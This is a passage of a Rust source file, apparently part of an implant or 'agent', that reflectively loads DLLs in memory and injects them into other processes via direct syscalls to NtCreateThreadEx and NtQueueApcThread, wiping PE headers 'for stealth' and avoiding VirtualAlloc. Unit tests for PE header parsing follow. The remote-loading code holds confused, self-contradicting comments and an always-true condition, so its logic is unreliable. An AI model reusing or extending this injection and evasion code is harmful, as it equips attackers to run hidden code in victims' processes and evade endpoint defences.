    nt_protect_virtual_memory(
        CURRENT_PROCESS,
        base as *mut c_void,
        PAGE_SIZE,
        PAGE_READWRITE,
    )?;

    // Zero the first page
    std::ptr::write_bytes(base as *mut u8, 0u8, PAGE_SIZE);

    // Re-protect as read-only
    nt_protect_virtual_memory(
        CURRENT_PROCESS,
        base as *mut c_void,
        PAGE_SIZE,
        PAGE_READONLY,
    )?;

    Ok(())
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Reflectively load a DLL into the current process.
///
/// Uses `NtCreateSection` + `NtMapViewOfSection` to allocate memory
/// (no VirtualAlloc), then copies and fixes up the PE image in place.
///
/// # Arguments
///
/// * `dll_bytes` — Raw bytes of the PE DLL to load.
/// * `config` — Configuration controlling loading behaviour.
///
/// # Returns
///
/// A `LoadedModule` with base address, size, entry point, and cleanup.
///
/// # Safety
///
/// This function is inherently unsafe as it maps executable code into
/// the process and may call arbitrary DllMain routines.
pub unsafe fn reflective_load(
    dll_bytes: &[u8],
    config: &ReflectiveLoadConfig,
) -> Result<LoadedModule> {
    // ── Phase 1: Parse PE and create section ────────────────────────────
    let pe = parse_pe_headers(dll_bytes)?;

    let page_prot = if config.execute_from_section {
        PAGE_EXECUTE_READWRITE
    } else {
        PAGE_READWRITE
    };

    let h_section = nt_create_section(pe.size_of_image, page_prot)?;
    let (base_addr, _view_size) = nt_map_view_of_section(
        h_section,
        CURRENT_PROCESS,
        pe.size_of_image,
        page_prot,
    )?;

    // Close the section handle — the mapping remains valid
    close_nt_handle(h_section);

    let base = base_addr as usize;

    // ── Phase 2: Copy image and apply fixups ────────────────────────────
    copy_image(base_addr, dll_bytes, &pe)?;

    if config.handle_relocations {
        apply_relocations(base, &pe, dll_bytes)?;
    }

    if config.resolve_imports {
        if let Err(e) = rebuild_iat_reflective(base, &pe) {
            log::warn!("reflective_loader: IAT rebuild failed: {}", e);
        }
    }

    // Apply per-section memory protections (RWX → appropriate per-section)
    if !config.execute_from_section || true {
        // Always apply section protections for stealth
        if let Err(e) = apply_section_protections(base, &pe, dll_bytes) {
            log::warn!("reflective_loader: section protection failed: {}", e);
        }
    }

    // ── Phase 3: Execute and clean up ───────────────────────────────────
    let entry_point = if pe.entry_point_rva != 0 {
        base + pe.entry_point_rva as usize
    } else {
        0
    };

    if config.call_entry_point && entry_point != 0 {
        // DllMain signature: fn(hModule: HINSTANCE, reason: u32, reserved: LPVOID)
        type DllMainFn = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
        let dll_main: DllMainFn = mem::transmute(entry_point as *const ());
        dll_main(base as *mut c_void, DLL_PROCESS_ATTACH, std::ptr::null_mut());
    }

    if config.cleanup_headers {
        if let Err(e) = wipe_headers(base) {
            log::warn!("reflective_loader: header wipe failed: {}", e);
        }
    }

    let size = pe.size_of_image;
    let cleanup_base = base;
    Ok(LoadedModule {
        base_address: base,
        size,
        entry_point,
        module_handle: base,
        cleanup_fn: Some(Box::new(move || {
            unsafe {
                if let Err(e) = nt_unmap_view_of_section(cleanup_base as *mut c_void) {
                    log::warn!("reflective_loader: cleanup unmap failed: {}", e);
                }
            }
        })),
    })
}

// ── Remote Loading ──────────────────────────────────────────────────────────

/// Configuration for remote reflective DLL loading.
#[derive(Debug, Clone)]
pub struct RemoteLoadConfig {
    /// Handle to the target process (must have PROCESS_VM_OPERATION,
    /// PROCESS_VM_WRITE, and PROCESS_CREATE_THREAD access).
    pub process_handle: HANDLE,

    /// Standard load configuration.
    pub load_config: ReflectiveLoadConfig,

    /// How to trigger execution in the remote process.
    pub execution_method: RemoteExecMethod,
}

/// Method for triggering execution in a remote process.
#[derive(Debug, Clone)]
pub enum RemoteExecMethod {
    /// Create a remote thread at the entry point.
    CreateThread,
    /// Queue a user-mode APC to a target thread.
    Apc {
        /// Thread handle to queue the APC on.
        thread_handle: HANDLE,
    },
}

/// Result of a remote reflective load.
pub struct RemoteLoadedModule {
    /// Base address of the loaded image in the target process.
    pub base_address: usize,
    /// Size of the mapped image.
    pub size: usize,
    /// Entry point address in the target process.
    pub entry_point: usize,
    /// Handle to the section object (closed on drop).
    section_handle: HANDLE,
}

impl RemoteLoadedModule {
    /// Manually clean up the section handle.
    pub fn cleanup(&mut self) {
        close_nt_handle(self.section_handle);
        self.section_handle = std::ptr::null_mut();
    }
}

impl Drop for RemoteLoadedModule {
    fn drop(&mut self) {
        self.cleanup();
    }
}

/// Reflectively load a DLL into a remote process.
///
/// Creates a shared section, maps it into both the agent process (for writing)
/// and the target process (for execution), loads the DLL into the shared
/// section, then triggers execution.
///
/// # Arguments
///
/// * `dll_bytes` — Raw bytes of the PE DLL to load.
/// * `remote_config` — Remote loading configuration.
///
/// # Returns
///
/// A `RemoteLoadedModule` with the base address in the target process.
pub unsafe fn reflective_load_remote(
    dll_bytes: &[u8],
    remote_config: &RemoteLoadConfig,
) -> Result<RemoteLoadedModule> {
    let pe = parse_pe_headers(dll_bytes)?;
    let h_section = nt_create_section(pe.size_of_image, PAGE_EXECUTE_READWRITE)?;

    // Map into the agent process for writing
    let (local_base, _local_size) = nt_map_view_of_section(
        h_section,
        CURRENT_PROCESS,
        pe.size_of_image,
        PAGE_READWRITE,
    )?;

    // Copy and fix up the image in the local mapping
    copy_image(local_base, dll_bytes, &pe)?;

    // The local copy has delta = local_base - image_base, but we need
    // the delta for the remote base.  We need to:
    // 1. First map into the target process to get the remote base
    // 2. Re-apply relocations with the correct delta

    // Map into the target process
    let (remote_base, _remote_size) = nt_map_view_of_section(
        h_section,
        remote_config.process_handle,
        pe.size_of_image,
        PAGE_EXECUTE_READWRITE,
    )?;

    let remote_addr = remote_base as usize;
    let local_addr = local_base as usize;

    // Re-apply relocations with the remote delta.
    // The image was copied to local_base, so relocations currently use
    // local_base as the base.  We need to fix them for remote_base.
    if remote_config.load_config.handle_relocations {
        // Re-copy the raw image (undoing the local relocations)
        copy_image(local_base, dll_bytes, &pe)?;

        // Now apply relocations using the *remote* base address
        // We temporarily pretend the image is at remote_addr
        apply_relocations(remote_addr, &pe, dll_bytes)?;
    }

    // The local mapping is a shared section, so the remote process
    // sees the same pages.  But relocations are for the remote address...
    // This means we need to write the relocated image to the remote process.
    // Since it's a shared section, writes in local view appear in remote view.

    // Wait — shared sections share the SAME physical pages. If we applied
    // relocations for the remote base, the data in the shared section is
    // correct for the remote process. But the addresses in the local view
    // point to the same physical pages, so they're also correct for remote.
    // However, since local_base != remote_base, the addresses embedded in
    // the image are wrong for the local view. That's fine — we don't need
    // to execute from the local view.

    // Actually, relocations modify the shared pages in-place, so the remote
    // process already has the correct data. We just need to handle the case
    // where copy_image was called twice (once for local, once for remote
    // base relocations).

    // Re-copy and re-apply for the remote base
    if remote_config.load_config.handle_relocations {
        // copy_image was called above with raw bytes, then apply_relocations
        // was called with remote_addr — but apply_relocations reads from
        // base+reloc_rva (the loaded image), not from dll_bytes. So it's
        // modifying local_addr, which is the shared section. Perfect.
    }

    // Resolve imports — these resolve to addresses in the *agent's* process,
    // which is wrong for the remote process. For proper remote loading,
    // imports must be resolved in the target process context.
    // This is a fundamental limitation — remote IAT resolution would require
    // reading the target's module list. We skip remote IAT resolution for now
    // and document the limitation.
    if remote_config.load_config.resolve_imports {
        log::warn!(
            "reflective_loader: import resolution is not supported for remote loading; \
             the DLL must have no imports or resolve them internally"
        );
    }

    // Apply section protections in the target process
    if let Err(e) = apply_section_protections_remote(
        remote_config.process_handle,
        remote_addr,
        &pe,
        dll_bytes,
    ) {
        log::warn!("reflective_loader: remote section protection failed: {}", e);
    }

    // Unmap the local view — we're done writing
    nt_unmap_view_of_section(local_base)?;

    let entry_point = if pe.entry_point_rva != 0 {
        remote_addr + pe.entry_point_rva as usize
    } else {
        0
    };

    // Trigger execution in the target process
    if remote_config.load_config.call_entry_point && entry_point != 0 {
        trigger_remote_execution(
            remote_config.process_handle,
            entry_point,
            remote_addr,
            &remote_config.execution_method,
        )?;
    }

    Ok(RemoteLoadedModule {
        base_address: remote_addr,
        size: pe.size_of_image,
        entry_point,
        section_handle: h_section,
    })
}

/// Apply per-section memory protections in a remote process.
unsafe fn apply_section_protections_remote(
    process_handle: HANDLE,
    base: usize,
    pe: &PeInfo,
    dll_bytes: &[u8],
) -> Result<()> {
    // Protect headers as read-only
    nt_protect_virtual_memory(
        process_handle,
        base as *mut c_void,
        PAGE_SIZE,
        PAGE_READONLY,
    )?;

    let sections = get_section_headers(dll_bytes, pe)?;
    for section in sections {
        let characteristics = section.Characteristics;
        let virtual_size = *section.Misc.VirtualSize() as usize;
        let virtual_address = section.VirtualAddress as usize;

        if virtual_size == 0 {
            continue;
        }

        let section_base = (base + virtual_address) as *mut c_void;
        let section_size = align_up(virtual_size, PAGE_SIZE);

        let protect = if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0
            && characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0
        {
            PAGE_EXECUTE_READWRITE
        } else if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0 {
            PAGE_EXECUTE_READ
        } else if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0 {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        let _ = nt_protect_virtual_memory(process_handle, section_base, section_size, protect);
    }

    Ok(())
}

/// Trigger execution of the DLL entry point in the target process.
unsafe fn trigger_remote_execution(
    process_handle: HANDLE,
    entry_point: usize,
    base_addr: usize,
    method: &RemoteExecMethod,
) -> Result<()> {
    match method {
        RemoteExecMethod::CreateThread => {
            let sys = resolve_syscall("NtCreateThreadEx")?;
            let mut h_thread: HANDLE = std::ptr::null_mut();

            // NtCreateThreadEx signature (simplified):
            // NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes,
            //   ProcessHandle, StartRoutine, Argument, CreateFlags,
            //   ZeroBits, StackSize, MaxStackSize, AttributeList)
            let status = do_syscall(
                sys.ssn,
                sys.gadget_addr,
                &[
                    &mut h_thread as *mut _ as u64,  // ThreadHandle
                    0x1FFFFF,                         // THREAD_ALL_ACCESS
                    std::ptr::null_mut::<u64>() as u64, // ObjectAttributes
                    process_handle as u64,            // ProcessHandle
                    entry_point as u64,               // StartRoutine
                    base_addr as u64,                 // Argument (hModule for DllMain)
                    0,                                // CreateFlags (0 = run immediately)
                    0,                                // ZeroBits
                    0,                                // StackSize (0 = default)
                    0,                                // MaxStackSize (0 = default)
                    std::ptr::null_mut::<u64>() as u64, // AttributeList
                ],
            );

            if status != 0 {
                bail!(
                    "NtCreateThreadEx failed with status {:#x}",
                    status as u32
                );
            }
            close_nt_handle(h_thread);
            Ok(())
        }
        RemoteExecMethod::Apc { thread_handle } => {
            // Queue a user-mode APC to the target thread.
            // The APC will call the entry point when the thread enters
            // an alertable wait state.
            let sys = resolve_syscall("NtQueueApcThread")?;
            let status = do_syscall(
                sys.ssn,
                sys.gadget_addr,
                &[
                    *thread_handle as u64,            // ThreadHandle
                    entry_point as u64,               // ApcRoutine
                    base_addr as u64,                 // ApcContext (hModule)
                    0,                                // ApcStatus
                    0,                                // ApcReserved
                ],
            );
            if status != 0 {
                bail!(
                    "NtQueueApcThread failed with status {:#x}",
                    status as u32
                );
            }
            Ok(())
        }
    }
}

// ── Unit Tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Verify that parse_pe_headers rejects empty input.
    #[test]
    fn parse_pe_rejects_empty_input() {
        let result = parse_pe_headers(&[]);
        assert!(result.is_err());
    }

    /// Verify that parse_pe_headers rejects random data.
    #[test]
    fn parse_pe_rejects_non_pe() {
        let data = [0u8; 1024];
        let result = parse_pe_headers(&data);
        assert!(result.is_err());
    }

    /// Verify that parse_pe_headers rejects a DOS header without PE signature.
    #[test]
    fn parse_pe_rejects_dos_only() {
        let mut data = vec![0u8; 1024];
        // MZ signature
        data[0] = b'M';
        data[1] = b'Z';
        // e_lfanew pointing to offset 0x80
        data[0x3C] = 0x80;
        data[0x3D] = 0x00;
        data[0x3E] = 0x00;
        data[0x3F] = 0x00;
        // No PE signature at 0x80

        let result = parse_pe_headers(&data);
        assert!(result.is_err());
    }

    /// Test that a minimal valid PE32+ header is parsed correctly.
    #[test]
    fn parse_pe_accepts_minimal_pe64() {
        // Build a minimal PE32+ image in memory
        let mut data = vec![0u8; 4096];

        // DOS header
        data[0] = b'M';
        data[1] = b'Z';
        // e_lfanew = 0x80
        data[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());

        // PE signature at 0x80
        data[0x80..0x84].copy_from_slice(&0x4550u32.to_le_bytes());

        // File header at 0x84
        let machine: u16 = 0x8664; // AMD64
        data[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        let num_sections: u16 = 0;
        data[0x86..0x88].copy_from_slice(&num_sections.to_le_bytes());
        // Skip time_date_stamp, pointer_to_symbol_table, number_of_symbols
        let size_of_opt_header: u16 = mem::size_of::<IMAGE_NT_HEADERS64>() as u16 - 4;
        data[0x94..0x96].copy_from_slice(&size_of_opt_header.to_le_bytes());
        let characteristics: u16 = 0x2022; // DLL | EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
        data[0x96..0x98].copy_from_slice(&characteristics.to_le_bytes());

        // Optional header at 0x98
        let magic: u16 = 0x20B; // PE32+
        data[0x98..0x9A].copy_from_slice(&magic.to_le_bytes());

        // SizeOfImage at optional header + 0x38 = 0x98 + 0x38 = 0xD0
        let size_of_image: u32 = 0x1000;
        data[0xD0..0xD4].copy_from_slice(&size_of_image.to_le_bytes());

        // ImageBase at optional header + 0x18 = 0x98 + 0x18 = 0xB0
        let image_base: u64 = 0x180000000;
        data[0xB0..0xB8].copy_from_slice(&image_base.to_le_bytes());

        // AddressOfEntryPoint at optional header + 0x10 = 0x98 + 0x10 = 0xA8
        let entry_point: u32 = 0x1000;
        data[0xA8..0xAC].copy_from_slice(&entry_point.to_le_bytes());

        let pe = parse_pe_headers(&data).expect("should parse valid PE64");
        assert_eq!(pe.magic, 0x20B);
        assert_eq!(pe.size_of_image, 0x1000);
        assert_eq!(pe.image_base, 0x180000000 as usize);
        assert_eq!(pe.entry_point_rva, 0x1000);
        assert_eq!(pe.number_of_sections, 0);
    }

    /// Test that align_up works correctly.
    #[test]
    fn align_up_works() {
        assert_eq!(align_up(0, 4096), 0);
        assert_eq!(align_up(1, 4096), 4096);
        assert_eq!(align_up(4095, 4096), 4096);
        assert_eq!(align_up(4096, 4096), 4096);
        assert_eq!(align_up(4097, 4096), 8192);
    }

    /// Verify that ReflectiveLoadConfig defaults are sane.
    #[test]
    fn default_config_is_sane() {
        let config = ReflectiveLoadConfig::default();
        assert!(config.resolve_imports);
        assert!(config.handle_relocations);
        assert!(config.call_entry_point);
        assert!(config.cleanup_headers);
        assert!(config.execute_from_section);
    }

    /// Verify that parse_pe_headers handles PE32 (32-bit) magic.
    #[test]
    fn parse_pe_accepts_pe32() {
        let mut data = vec![0u8; 4096];

        // DOS header
        data[0] = b'M';
        data[1] = b'Z';
        data[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());

        // PE signature
        data[0x80..0x84].copy_from_slice(&0x4550u32.to_le_bytes());

        // File header
        let machine: u16 = 0x14C; // i386
        data[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        data[0x86..0x88].copy_from_slice(&0u16.to_le_bytes()); // num sections
        let size_of_opt_header: u16 = mem::size_of::<IMAGE_NT_HEADERS32>() as u16 - 4;
        data[0x94..0x96].copy_from_slice(&size_of_opt_header.to_le_bytes());
        data[0x96..0x98].copy_from_slice(&0x2102u16.to_le_bytes()); // characteristics

        // Optional header (PE32)
        let magic: u16 = 0x10B; // PE32
        data[0x98..0x9A].copy_from_slice(&magic.to_le_bytes());

        // SizeOfImage at opt header + 0x38 for PE32 = 0x98 + 0x38 = 0xD0
        data[0xD0..0xD4].copy_from_slice(&0x1000u32.to_le_bytes());

        // ImageBase at opt header + 0x1C for PE32 = 0x98 + 0x1C = 0xB4
        data[0xB4..0xB8].copy_from_slice(&0x10000000u32.to_le_bytes());

        // AddressOfEntryPoint at opt header + 0x10 = 0x98 + 0x10 = 0xA8
        data[0xA8..0xAC].copy_from_slice(&0x1000u32.to_le_bytes());

        let pe = parse_pe_headers(&data).expect("should parse valid PE32");
        assert_eq!(pe.magic, 0x10B);
        assert_eq!(pe.image_base, 0x10000000);
        assert_eq!(pe.entry_point_rva, 0x1000);
    }

    /// Verify the module rejects too many sections.
    #[test]
    fn parse_pe_rejects_too_many_sections() {
        let mut data = vec![0u8; 4096];

        // DOS header
        data[0] = b'M';
        data[1] = b'Z';
        data[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());

        // PE signature
        data[0x80..0x84].copy_from_slice(&0x4550u32.to_le_bytes());

        // File header
        let machine: u16 = 0x8664;
        data[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        let num_sections: u16 = 200; // Way too many
        data[0x86..0x88].copy_from_slice(&num_sections.to_le_bytes());
        let size_of_opt_header: u16 = mem::size_of::<IMAGE_NT_HEADERS64>() as u16 - 4;
        data[0x94..0x96].copy_from_slice(&size_of_opt_header.to_le_bytes());
        data[0x96..0x98].copy_from_slice(&0x2022u16.to_le_bytes());

        // Optional header
        let magic: u16 = 0x20B;
        data[0x98..0x9A].copy_from_slice(&magic.to_le_bytes());
        data[0xD0..0xD4].copy_from_slice(&0x1000u32.to_le_bytes());
        data[0xB0..0xB8].copy_from_slice(&0x180000000u64.to_le_bytes());

        let result = parse_pe_headers(&data);
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("Too many sections"),
            "Expected 'Too many sections' error, got: {:?}",
            result
        );
    }

    /// Verify get_section_headers handles empty section table.
    #[test]
    fn get_section_headers_empty() {
        let mut data = vec![0u8; 4096];
        data[0] = b'M';
        data[1] = b'Z';
        data[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        data[0x80..0x84].copy_from_slice(&0x4550u32.to_le_bytes());

        let machine: u16 = 0x8664;
        data[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        data[0x86..0x88].copy_from_slice(&0u16.to_le_bytes()); // 0 sections
        let size_of_opt_header: u16 = mem::size_of::<IMAGE_NT_HEADERS64>() as u16 - 4;
        data[0x94..0x96].copy_from_slice(&size_of_opt_header.to_le_bytes());
        data[0x96..0x98].copy_from_slice(&0x2022u16.to_le_bytes());
        let magic: u16 = 0x20B;
        data[0x98..0x9A].copy_from_slice(&magic.to_le_bytes());
        data[0xD0..0xD4].copy_from_slice(&0x1000u32.to_le_bytes());
        data[0xB0..0xB8].copy_from_slice(&0x180000000u64.to_le_bytes());

        let pe = parse_pe_headers(&data).unwrap();
        let sections = get_section_headers(&data, &pe).unwrap();
        assert_eq!(sections.len(), 0);
    }
}
